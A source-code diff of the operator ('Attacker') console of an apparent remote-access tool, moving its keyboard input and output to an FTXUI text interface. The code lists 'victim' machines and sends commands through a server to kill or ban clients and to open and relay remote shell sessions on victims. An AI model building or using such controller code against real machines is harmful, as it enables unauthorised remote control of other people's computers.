@@ -1,6 +1,6 @@
 #include "attacker.hpp"
+#include "../commands.hpp"
 #include <sstream>
-#include <conio.h>
 
 static constexpr uint32_t hash(const std::string s) noexcept {
 	uint32_t hash = 5381;
@@ -9,115 +9,73 @@ static constexpr uint32_t hash(const std::string s) noexcept {
 	return hash;
 }
 
-Attacker::Attacker(std::string inHId)
+Attacker::Attacker(std::string inHId, ftxui::Tui& inTui)
 	:
-	myHId(inHId)
+	myHId(inHId),
+	tui(inTui)
 {
 	receiveTcpThread = new std::thread([this]() {
 		while (true)
 			receiveTcp();
 		});
-
-	printMsg("\033[32m" + myHId + "> \033[0m");
 }
 
 int Attacker::update()
 {
 	sf::Clock clock;
 
-	while (_kbhit()) {
-		int ch = _getch();
-		//enter key
-		if (ch == 13) {
-			consoleMemory << cmdBuffer << "\n";
-			std::cout << "\n";
+	while (tui.server_commands.size() > 0) {
+		std::string line = tui.server_commands.front();
+		tui.server_commands.pop();
 
-			if (isSshActive) {
-				std::stringstream ss(cmdBuffer);
-				std::string cmd;
-				ss >> cmd;
-				//exit ssh session
-				if (cmd == "exit") {
-					sf::Packet req;
-					req << uint16_t(0) << uint8_t(Cmd::END_SSH);
-					auto _ = server.send(req);
+		tui.printServerShell(" > " + line + "\n");
 
-					isSshActive = false;
-					printMsg("\033[32m" + myHId + "> \033[0m");
-				}
-				//send ssh data
-				else {
-					sf::Packet req;
-					req << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << cmdBuffer;
-					auto _ = server.send(req);
-				}
+		if (!handleCmd(line))
+			return 1;
+	}
+	while (tui.ssh_commands.size() > 0) {
+		if (isSshActive) {
+			std::string line = tui.ssh_commands.front();
+			tui.ssh_commands.pop();
+
+			//tui.printSshShell(" > " + line + "\n");
+
+			std::stringstream ss(line);
+			std::string cmd;
+			ss >> cmd;
+			//exit ssh session
+			if (cmd == "exit") {
+				sf::Packet req;
+				req << uint16_t(0) << uint8_t(Cmd::END_SSH);
+				auto _ = server.send(req);
+
+				isSshActive = false;
+
+				tui.ssh_commands = std::queue<std::string>();
+				tui.printSshShell("\n \n ");
 			}
-			else if (!handleCmd(cmdBuffer))
-				return 1;
-
-			cmdBuffer.clear();
-		}
-		//backspace
-		else if (ch == 8) { 
-			if (!cmdBuffer.empty()) {
-				cmdBuffer.pop_back();
-
-				system("cls");
-				std::cout << listMemory.str() << consoleMemory.str() << cmdBuffer;
+			//send ssh data
+			else {
+				sf::Packet req;
+				req << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << line;
+				auto _ = server.send(req);
 			}
 		}
-		//arrow or special key
-		else if (ch == 0 || ch == 224) {
-			int arrow = _getch();
-			//left
-			if (arrow == 75) {
-
-			}
-			//right
-			else if (arrow == 77) {
-
-			}
-			//up
-			else if (arrow == 72) {
-
-			}
-			//down
-			else if (arrow == 80) {
-
-			}
-		}
-		//normal character
-		else if (isprint(ch)) {
-			cmdBuffer += static_cast<char>(ch);
-			std::cout << static_cast<char>(ch);
+		else {
+			tui.ssh_commands = std::queue<std::string>();
+			tui.printSshShell("ssh is not active\n");
 		}
 	}
-	
-	if (std::cin.eof())
-		return 0;
 	
 	while (packetsToProcess.size() > 0) {
 		handlePacket(packetsToProcess[0]);
 		packetsToProcess.erase(packetsToProcess.begin());
 	}
-	
-	if (wasDisconnected) {
-		wasDisconnected = false;
-		listMemory = std::stringstream();
 
-		consoleMemory << cmdBuffer;
-		cmdBuffer.clear();
-		printErr(" [disconnected from server]\n");
-		printMsg("\033[32m" + myHId + "> \033[0m");
-
-		system("cls");
-		std::cout << consoleMemory.str();
-	}
-
-	//set to ~100 fps
+	//set to ~10 fps
 	auto passed = clock.getElapsedTime().asMicroseconds();
-	if (passed < 10'000) 
-		sf::sleep(sf::microseconds(10'000 - passed));
+	if (passed < 100'000) 
+		sf::sleep(sf::microseconds(100'000 - passed));
 
 	return 0;
 }
@@ -126,16 +84,23 @@ void Attacker::receiveTcp()
 {
 	sf::Packet p;
 	auto status = server.receive(p);
+
 	//update initialization status
 	if (status == sf::Socket::Status::Disconnected) {
 		if (isInitialized) {
 			isInitialized = false;
 			isAdmin = false;
 			isSshActive = false;
-			wasDisconnected = true;
+
+			tui.clients_overview_output = "Server connection required";
+			tui.server_database_output = "Server connection and admin privileges required";
+			tui.info_title = ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red);
+			tui.triggerRedraw();
 		}
 		sf::sleep(sf::milliseconds(100));
 	}
+	if (status == sf::Socket::Status::Error)
+		sf::sleep(sf::milliseconds(100));
 	if (status != sf::Socket::Status::Done)
 		return;
 
@@ -150,14 +115,15 @@ void Attacker::receiveTcp()
 
 void Attacker::connectServer(std::stringstream& ss, bool pw)
 {
-	listMemory = std::stringstream();
 	isInitialized = false;
 	isAdmin = false;
 	isSshActive = false;
 	server.disconnect();
 
-	system("cls");
-	std::cout << consoleMemory.str();
+	tui.clients_overview_output = "Server connection required";
+	tui.server_database_output = "Server connection and admin privileges required";
+	tui.info_title = ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red);
+	tui.triggerRedraw();
 
 	std::string ipStr;
 	short port = 0;
@@ -173,7 +139,7 @@ void Attacker::connectServer(std::stringstream& ss, bool pw)
 			port = std::stoi(ipStr.substr(pos + 1));
 		}
 		catch (const std::invalid_argument&) {
-			printErr("port provided is not valid\n");
+			tui.printServerShell("port provided is not valid\n");
 			return;
 		}
 		ipStr = ipStr.substr(0, pos);
@@ -182,35 +148,31 @@ void Attacker::connectServer(std::stringstream& ss, bool pw)
 	//parse the ip address
 	auto ip = sf::IpAddress::resolve(ipStr);
 	if (!ip.has_value()) {
-		printErr("ip address provided is not valid\n");
+		tui.printServerShell("ip address provided is not valid\n");
 		return;
 	}
 	serverIp = ip.value();
 
 	//connect to the server
 	if (server.connect(serverIp, port) != sf::Socket::Status::Done) {
-		printErr("failed to connect to server\n");
+		tui.printServerShell("failed to connect to server\n");
 		return;
 	}
 
 	//take password input from the user (if admin)
 	std::string password = "";
 	if (pw) {
-		printMsg("enter the password: ");
+		tui.printServerShell("enter the password: ");
 		while (true) {
-			int lastChar = getch();
-			if (lastChar == 13) {
-				printMsg("\n");
-				break;
+			if (tui.server_commands.size() < 1) {
+				sf::sleep(sf::milliseconds(100));
+				continue;
 			}
-			if (lastChar == 8 && !password.empty()) {
-				password = password.substr(0, password.length() - 1);
-				printMsg("\b \b");
-			}
-			else if (lastChar >= 33 && lastChar <= 125) {
-				password += char(lastChar);
-				printMsg("*");
-			}
+
+			password = tui.server_commands.front();
+			tui.server_commands.pop();
+			tui.printServerShell(std::string(password.size(), '*') + "\n");
+			break;
 		}
 	}
 
@@ -222,26 +184,28 @@ void Attacker::connectServer(std::stringstream& ss, bool pw)
 	if (pw)
 		req << password;
 	if (server.send(req) != sf::Socket::Status::Done) {
-		printErr("failed to send registration request\n");
+		tui.printServerShell("failed to send registration request\n");
+
 		server.disconnect();
 		return;
 	}
 
 	//wait for initialization response and output progress
-	printMsg("waiting for response: [");
+	tui.printServerShell("waiting for response: [");
 	for (int i = 0; i < 10; i++) {
 		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
 			sf::sleep(sf::milliseconds(500));
-			printMsg("*");
+			tui.printServerShell("*");
 		}
 		else
-			printMsg(".");
+			tui.printServerShell(".");
 	}
-	printMsg("] - ");
+	tui.printServerShell("] - ");
 
 	//initialization wasn't successful
 	if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-		printErr("timed out\n");
+		tui.printServerShell("timed out\n");
+
 		server.disconnect();
 		return;
 	}
@@ -253,9 +217,10 @@ void Attacker::connectServer(std::stringstream& ss, bool pw)
 	res >> success;
 	if (!success) {
 		if (pw)
-			printErr("failed admin login\n");
+			tui.printServerShell("failed admin login\n");
 		else
-			printErr("you are banned :(\n");
+			tui.printServerShell("you are banned :(\n");
+
 		server.disconnect();
 		return;
 	}
@@ -264,10 +229,14 @@ void Attacker::connectServer(std::stringstream& ss, bool pw)
 	isInitialized = true;
 	isAdmin = pw;
 
+	std::string add = server.getRemoteAddress().value().toString() + ":" + std::to_string(server.getRemotePort());
+	tui.info_title = ftxui::text("Connected to " + add) | ftxui::color(ftxui::Color::Green);
+	tui.triggerRedraw();
+
 	if (pw)
-		printMsg("admin access granted (" + std::to_string(myId) + ")\n");
+		tui.printServerShell("admin access granted (" + std::to_string(myId) + ")\n");
 	else
-		printMsg("initialized (" + std::to_string(myId) + ")\n");
+		tui.printServerShell("initialized (" + std::to_string(myId) + ")\n");
 }
 
 bool Attacker::handleCmd(const std::string& s)
@@ -276,15 +245,17 @@ bool Attacker::handleCmd(const std::string& s)
 	std::string cmd;
 	ss >> cmd;
 
+	//TODO: process command only if correct number of arguments is provided
+	//TODO: add help command
+
 	switch (hash(cmd)) {
 	case hash("exit"): {
 		return false;
 		break;
 	}
 	case hash("clear"): {
-		consoleMemory = std::stringstream();
-		system("cls");
-		std::cout << listMemory.str();
+		tui.server_shell_output = "";
+		tui.triggerRedraw();
 		break;
 	}
 	case hash("connect"): {
@@ -297,106 +268,106 @@ bool Attacker::handleCmd(const std::string& s)
 	}
 	case hash("name"): {
 		if (!isInitialized) {
-			printErr("client is not initialized\n");
+			tui.printServerShell("client is not initialized\n");
 			break;
 		}
 		else if (!isAdmin) {
-			printErr("admin privileges are needed\n");
+			tui.printServerShell("admin privileges are needed\n");
 			break;
 		}
 
 		std::string oHId, name;
 		ss >> oHId >> name;
 		if (oHId.empty() || name.empty()) {
-			printErr("invalid arguments\n");
+			tui.printServerShell("invalid arguments\n");
 			break;
 		}
 
 		sf::Packet req;
 		req << uint16_t(0) << uint8_t(Cmd::CHANGE_NAME) << oHId << name;
 		if (server.send(req) != sf::Socket::Status::Done)
-			printErr("failed to send request to server\n");
+			tui.printServerShell("failed to send request to server\n");
 		break;
 	}
 	case hash("ban"): {
 		if (!isInitialized) {
-			printErr("client is not initialized\n");
+			tui.printServerShell("client is not initialized\n");
 			break;
 		}
 		else if (!isAdmin) {
-			printErr("admin privileges are needed\n");
+			tui.printServerShell("admin privileges are needed\n");
 			break;
 		}
 
 		std::string oHId;
 		ss >> oHId;
 		if (oHId.empty()) {
-			printErr("invalid arguments\n");
+			tui.printServerShell("invalid arguments\n");
 			break;
 		}
 
 		sf::Packet req;
 		req << uint16_t(0) << uint8_t(Cmd::BAN_HID) << oHId;
 		if (server.send(req) != sf::Socket::Status::Done)
-			printErr("failed to send request to server\n");
+			tui.printServerShell("failed to send request to server\n");
 		break;
 	}
 	case hash("unban"): {
 		if (!isInitialized) {
-			printErr("client is not initialized\n");
+			tui.printServerShell("client is not initialized\n");
 			break;
 		}
 		else if (!isAdmin) {
-			printErr("admin privileges are needed\n");
+			tui.printServerShell("admin privileges are needed\n");
 			break;
 		}
 
 		std::string oHId;
 		ss >> oHId;
 		if (oHId.empty()) {
-			printErr("invalid arguments\n");
+			tui.printServerShell("invalid arguments\n");
 			break;
 		}
 
 		sf::Packet req;
 		req << uint16_t(0) << uint8_t(Cmd::UNBAN_HID) << oHId;
 		if (server.send(req) != sf::Socket::Status::Done)
-			printErr("failed to send request to server\n");
+			tui.printServerShell("failed to send request to server\n");
 		break;
 	}
 	case hash("kill"): {
 		if (!isInitialized) {
-			printErr("client is not initialized\n");
+			tui.printServerShell("client is not initialized\n");
 			break;
 		}
 		else if (!isAdmin) {
-			printErr("admin privileges are needed\n");
+			tui.printServerShell("admin privileges are needed\n");
 			break;
 		}
 
 		uint16_t oId = uint16_t(0);
 		ss >> oId;
 		if (oId == uint16_t(0)) {
-			printErr("invalid arguments\n");
+			tui.printServerShell("invalid arguments\n");
 			break;
 		}
 
 		sf::Packet req;
 		req << uint16_t(0) << uint8_t(Cmd::KILL) << oId;
 		if (server.send(req) != sf::Socket::Status::Done)
-			printErr("failed to send request to server\n");
+			tui.printServerShell("failed to send request to server\n");
 		break;
 	}
 	case hash("ssh"): {
 		if (!isInitialized) {
-			printErr("client is not initialized\n");
+			tui.printServerShell("client is not initialized\n");
 			break;
 		}
 
 		uint16_t oId = uint16_t(0);
 		ss >> oId;
 		if (oId == uint16_t(0)) {
-			printErr("invalid arguments\n");
+			tui.printServerShell("invalid arguments\n");
 			break;
 		}
 
@@ -404,21 +375,21 @@ bool Attacker::handleCmd(const std::string& s)
 		uint16_t reqId = requestId++;
 		req << uint16_t(reqId) << uint8_t(Cmd::START_SSH) << oId;
 		if (server.send(req) != sf::Socket::Status::Done)
-			printErr("failed to send request to server\n");
+			tui.printServerShell("failed to send request to server\n");
 
-		printMsg("waiting for response: [");
+		tui.printServerShell("waiting for response: [");
 		for (int i = 0; i < 10; i++) {
 			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-				printMsg("*");
+				tui.printServerShell("*");
 				sf::sleep(sf::milliseconds(500));
 			}
 			else
-				printMsg(".");
+				tui.printServerShell(".");
 		}
-		printMsg("] - ");
+		tui.printServerShell("] - ");
 
 		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-			printErr("timed out\n");
+			tui.printServerShell("timed out\n");
 			break;
 		}
 
@@ -430,27 +401,30 @@ bool Attacker::handleCmd(const std::string& s)
 		uint8_t code = 0;
 		res >> code;
 		if (code == 1) {
-			printMsg("loading ssh session\n");
+			tui.ssh_shell_output = "";
+			tui.shell_tab_selected = 1;
+
+			tui.printServerShell("loading ssh session...\n");
 			isSshActive = true;
 		}
 		else if (code == 2)
-			printErr("ssh session already active\n");
+			tui.printServerShell("ssh session already active\n");
 		else if (code == 3)
-			printErr("invalid victim id\n");
+			tui.printServerShell("invalid victim id\n");
 		else if (code == 4)
-			printErr("victim occupied\n");
+			tui.printServerShell("victim occupied\n");
 		else
-			printErr("unknown error\n");
+			tui.printServerShell("unknown error\n");
 
 		break;
 	}
 	case hash("save"): {
 		if (!isInitialized) {
-			printErr("client is not initialized\n");
+			tui.printServerShell("client is not initialized\n");
 			break;
 		}
 		else if (!isAdmin) {
-			printErr("admin privileges are needed\n");
+			tui.printServerShell("admin privileges are needed\n");
 			break;
 		}
 
@@ -458,37 +432,34 @@ bool Attacker::handleCmd(const std::string& s)
 		uint16_t reqId = requestId++;
 		req << uint16_t(reqId) << uint8_t(Cmd::SAVE_DATASET);
 		if (server.send(req) != sf::Socket::Status::Done)
-			printErr("failed to send request to server\n");
+			tui.printServerShell("failed to send request to server\n");
 
-		printMsg("waiting for response: [");
+		tui.printServerShell("waiting for response: [");
 		for (int i = 0; i < 10; i++) {
 			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-				printMsg("*");
+				tui.printServerShell("*");
 				sf::sleep(sf::milliseconds(500));
 			}
 			else
-				printMsg(".");
+				tui.printServerShell(".");
 		}
-		printMsg("] - ");
+		tui.printServerShell("] - ");
 
 		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
-			printErr("request timed out\n");
+			tui.printServerShell("request timed out\n");
 			break;
 		}
 		else
-			printMsg("saved database\n");
+			tui.printServerShell("saved database\n");
 
 		break;
 	}
 	case hash(""): break;
 	default: {
-		printErr("enter a valid command\n");
+		tui.printServerShell("enter a valid command\n");
 		break;
 	}
 	}
-
-	if (!isSshActive)
-		printMsg("\033[32m" + myHId + "> \033[0m");
 
 	return true;
 }
@@ -498,11 +469,11 @@ void Attacker::handlePacket(sf::Packet& p)
 	uint8_t cmd;
 	p >> cmd;
 
-	if (cmd == uint8_t(Cmd::LIST_UPDATE))
+	if (cmd == uint8_t(Cmd::CLIENTS_UPDATE))
 		updateList(p);
 	else if (cmd == uint8_t(Cmd::END_SSH)) {
 		isSshActive = false;
-		printMsg("\n\033[32m" + myHId + "> \033[0m");
+		tui.triggerRedraw();
 	}
 	else if (cmd == uint8_t(Cmd::SSH_DATA)) {
 		if (!isSshActive)
@@ -510,53 +481,52 @@ void Attacker::handlePacket(sf::Packet& p)
 
 		std::string data;
 		p >> data;
-		printMsg("\033[33m" + data + "\033[0m");
+
+		tui.printSshShell(data);
 	}
 }
 
 void Attacker::updateList(sf::Packet& p)
 {
-	listMemory = std::stringstream();
-	listMemory << "\033[36m";
 	uint16_t dbSize, clientsSize;
 
 	p >> dbSize;
 	//database is only sent to admins
-	if (dbSize > 0) {
-		listMemory << "DATABASE:\n";
+	if (dbSize > 0 || isAdmin) {
+		std::stringstream ss_database("");
 		for (int i = 0; i < dbSize; i++) {
 			std::string oHId = "", name = "";
 			bool ban = false;
 			p >> oHId >> name >> ban;
-			listMemory << " - " << oHId << " (" << name << "): ";
+			ss_database << "- " << oHId << " (" << name << "): ";
 			if (ban)
-				listMemory << "banned\n";
+				ss_database << "banned\n";
 			else
-				listMemory << "not banned\n";
+				ss_database << "not banned\n";
 		}
-		listMemory << "\n";
+		tui.server_database_output = ss_database.str();
 	}
+	else if (isInitialized)
+		tui.server_database_output = "Admin privileges required";
 
 	p >> clientsSize;
-	listMemory << "CLIENTS:\n";
+	std::stringstream ss_clients("");
 	for (int i = 0; i < clientsSize; i++) {
 		std::string oHId = "", ip = "";
 		uint16_t id = 0;
 		bool att = false, adm = false;
 		p >> oHId >> ip >> id >> att >> adm;
 
-		listMemory << " - " << oHId << " (" << id << "): ";
+		ss_clients << "- " << oHId << " (" << id << "): ";
 		if (adm)
-			listMemory << "admin - " << ip;
+			ss_clients << "admin - " << ip;
 		else if (att)
-			listMemory << "attacker - " << ip;
+			ss_clients << "attacker - " << ip;
 		else
-			listMemory << "victim - " << ip;
+			ss_clients << "victim - " << ip;
 
-		listMemory << "\n";
+		ss_clients << "\n";
 	}
-	listMemory << "\033[0m\n";
-
-	system("cls");
-	std::cout << listMemory.str() << consoleMemory.str() << cmdBuffer;
+	tui.clients_overview_output = ss_clients.str();
+	tui.triggerRedraw();
 }
